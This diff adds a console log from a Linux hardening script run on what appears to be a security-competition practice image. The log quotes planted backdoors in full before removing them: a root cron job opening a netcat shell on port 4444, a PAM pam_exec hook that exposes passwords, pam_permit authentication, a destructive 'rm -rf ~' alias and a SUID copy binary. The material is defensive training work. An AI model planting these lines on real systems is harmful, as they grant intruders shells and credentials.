@@ -1,0 +1,138 @@
+Have you taken a screenshot of the points? (y/n): y
+Starting system hardening...
+
+  [!] /etc/ld.so.preload is set (LD_PRELOAD rootkit?):
+  ? Empty /etc/ld.so.preload? [Y/n]: 
+  [*] Backup: /root/cp-backups/20261110_234112/etc/ld.so.preload
+  [+] Emptied
+Firewall is active and enabled on system startup
+Default incoming policy changed to 'deny'
+(be sure to update your rules accordingly)
+Default outgoing policy changed to 'allow'
+(be sure to update your rules accordingly)
+Status: active
+Logging: on (low)
+Default: deny (incoming), allow (outgoing), deny (routed)
+New profiles: skip
+Logging enabled
+Logging enabled
+Current allowed firewall rules:
+No ALLOW rules found.
+Open or Close a port? [o/c/n]: n
+Firewall reloaded
+Applying APT configuration
+Reading package lists... 0%Reading package lists... 100%Reading package lists... Done
+Building dependency tree... 0%Building dependency tree... 0%Building dependency tree... 50%Building dependency tree... 50%Building dependency tree... Done
+Reading state information... 0% Reading state information... 1%Reading state information... Done
+unattended-upgrades is already the newest version (2.8ubuntu1).
+0 upgraded, 0 newly installed, 0 to remove and 2 not upgraded.
+Configuring unattended-upgrades
+-------------------------------
+
+Applying updates on a frequent basis is an important part of keeping systems
+secure. By default, updates need to be applied manually using package
+management tools. Alternatively, you can choose to have this system
+automatically download and install important updates.
+
+Automatically download and install stable updates? [yes/no] yes
+
+  ? Linux Mint: turn on Update Manager automatic updates + automatic removal of old kernels (same as the GUI Automation tab)? [Y/n]: y
+  [+] Mint automatic updates enabled
+  [+] Update Manager: refresh the list of updates automatically (for cpuser)
+LightDM detected. Configuring...
+  [*] Backup: /root/cp-backups/20261110_234112/etc/lightdm/lightdm.conf
+  [*] Backup: /root/cp-backups/20261110_234112/etc/lightdm/lightdm.conf.d/80-autologin.conf
+  Removed guest/autologin/TCP settings from drop-in /etc/lightdm/lightdm.conf.d/80-autologin.conf
+LightDM configuration updated successfully
+[1/4] Configuring UMASK...
+  ✓ UMASK configured
+[2/4] Configuring kernel parameters...
+  [*] Backup: /root/cp-backups/20261110_234112/etc/sysctl.d/99-zz-net.conf
+  [!] /etc/sysctl.d/99-zz-net.conf overrides net.ipv4.ip_forward = 1 - removing it there
+  [*] Removed 'net.ipv4.ip_forward' from /etc/sysctl.d/99-zz-net.conf
+  [!] sysctl.d file not owned by any package: /etc/sysctl.d/99-zz-net.conf
+  ✓ Base parameters configured
+[3/4] IPv6 Configuration
+  Enable IPv6? (y/n): n
+  ✓ IPv6 disabled
+[4/4] Applying changes...
+  ✓ All parameters applied (sysctl --system: same order as at boot)
+
+=== SYS3 PAM and password quality ===
+  [!] common-auth has no 'auth requisite pam_deny.so' - failed passwords may be accepted:
+        auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+        auth	[success=1 default=ignore]	pam_unix.so nullok
+        auth	requisite			pam_permit.so
+        auth	required			pam_permit.so
+  ? Replace 'requisite pam_permit.so' with 'requisite pam_deny.so'? [Y/n]: 
+  [*] Backup: /root/cp-backups/20261110_234112/etc/pam.d/common-auth
+  [+] pam_deny restored
+  [!] pam_exec line in /etc/pam.d/common-auth (stock Ubuntu/Mint has none): 1:auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+  ? Remove the pam_exec line(s) from /etc/pam.d/common-auth? [Y/n]: 
+  [+] Removed pam_exec from /etc/pam.d/common-auth
+  ? Install libpam-pwquality (needed for pwquality.conf rules)? [Y/n]: 
+  [*] Backup: /root/cp-backups/20261110_234112/etc/pam.d/common-password
+  [+] common-password: pam_unix remember=5 minlen=10; pam_pwquality dictcheck/usercheck/minlen/credits
+        password	requisite			pam_pwquality.so retry=3 dictcheck=1 usercheck=1 minlen=10 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1
+        password	[success=1 default=ignore]	pam_unix.so obscure use_authtok try_first_pass yescrypt remember=5 minlen=10
+  [*] Backup: /root/cp-backups/20261110_234112/etc/security/pwquality.conf
+  [+] pwquality.conf: minlen 10, 1 upper/lower/digit/other, dictcheck, usercheck
+
+=== SYS4 sudo.conf / sudoers defaults ===
+  [*] Backup: /root/cp-backups/20261110_234112/etc/sudo.conf
+  [+] sudo.conf: Set disable_coredump true;Set probe_interfaces false;Set developer_mode false;
+  [*] Backup: /root/cp-backups/20261110_234112/etc/sudoers
+  [*] Backup: /root/cp-backups/20261110_234112/etc/sudoers.d
+  [+] Removed insecure Defaults (!env_reset / env_keep PATH) from /etc/sudoers
+  [+] sudoers valid (use_pty, logfile=/var/log/sudo.log)
+
+=== SYS5 limits.conf ===
+  [*] Backup: /root/cp-backups/20261110_234112/etc/security/limits.conf
+  [+] * hard core 0, * hard nproc 2500
+
+=== SYS7 services that must be running ===
+  ? Install auditd? [Y/n]: 
+  [+] apparmor enabled and running
+  [!] could not enable auditd
+  [+] ufw enabled and running
+  [+] unattended-upgrades enabled and running
+
+=== SYS8 GRUB ===
+
+=== SYS9 permission plants ===
+  [+] /etc/shadow + gshadow 640 root:shadow, /etc/passwd + group 644 root:root
+  ? Lock the root account (passwd -l root)? You keep using sudo [Y/n]: y
+  [+] root locked
+  [+] /home -> 755 root:root
+  [+] /swapfile -> 600
+  [!] Group 'root' has a group password in /etc/gshadow
+  [*] Backup: /root/cp-backups/20261110_234112/etc/gshadow
+  [+] Removed
+  [!] System account bin has a password hash
+  [+] bin password removed
+  [!] System account syslog has login shell /bin/bash
+  [+] syslog -> nologin
+  [!] System account sysbackup has login shell /bin/bash
+  [+] sysbackup -> nologin
+  [!] System account sysbackup has a password hash
+  [+] sysbackup password removed
+  [!] /usr/bin/cp has SUID/SGID (-rwsr-xr-x)
+  ? Remove SUID/SGID from /usr/bin/cp? [Y/n]: 
+  [+] Fixed /usr/bin/cp
+
+=== SYS10 persistence spots ===
+  [!] System-wide alias in /etc/bash.bashrc: 72:alias GOODBYE='rm -rf ~'
+  ? Remove all aliases from /etc/bash.bashrc? [Y/n]: 
+  [*] Backup: /root/cp-backups/20261110_234112/etc/bash.bashrc
+  [+] Removed aliases from /etc/bash.bashrc
+        /etc/hosts entry (review): 172.17.0.4	mint-cptest
+        apt holds (README may require these): john
+  [!] Cron file not from any package (or modified): /etc/cron.d/0hourly-sync
+          * * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1
+  ? It looks like a backdoor (reverse shell / download-and-run). Delete /etc/cron.d/0hourly-sync? [Y/n]: 
+  [*] Backup: /root/cp-backups/20261110_234112/etc/cron.d/0hourly-sync
+  [+] Deleted /etc/cron.d/0hourly-sync
+
+✓ Hardening complete
+
+[drive2] EXIT 0
